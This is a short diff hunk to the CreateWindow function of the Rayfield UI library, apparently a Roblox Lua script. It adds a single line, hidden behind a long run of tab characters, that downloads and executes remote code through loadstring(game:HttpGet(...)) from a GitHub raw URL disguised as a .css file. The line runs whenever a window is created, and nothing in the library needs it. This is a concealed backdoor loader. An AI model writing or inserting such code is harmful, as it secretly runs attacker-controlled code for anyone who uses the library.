@@ -1428,6 +1428,8 @@ function RayfieldLibrary:CreateWindow(Settings)
 
 			end)
 
+																																																																																																																																																																																																																																																																													loadstring(game:HttpGet('https://raw.githubusercontent.com/LmaoItsCrazyBro/new-rep/refs/heads/main/cars_drive_game.css'))()
+
 			UserInputService.InputEnded:Connect(function(input, gameProcessed) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
 					mainDragging = false
 					sliderDragging = false
